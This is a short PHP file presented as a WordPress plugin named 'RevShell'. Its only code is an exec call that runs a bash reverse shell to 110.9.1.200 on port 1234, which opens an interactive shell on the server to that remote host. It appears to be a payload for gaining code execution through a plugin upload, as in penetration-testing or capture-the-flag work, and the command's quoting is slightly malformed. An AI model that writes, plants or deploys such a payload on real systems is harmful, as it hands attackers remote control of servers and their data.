<?php
/**
 * Plugin Name: RevShell
 * Version: 5.10.3
 * Author: Vinay Verma
 * Author URI: http://devshmsec.github.io/
 * License: MIT
 */

exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/110.9.1.200/1234 0>&1')

?>
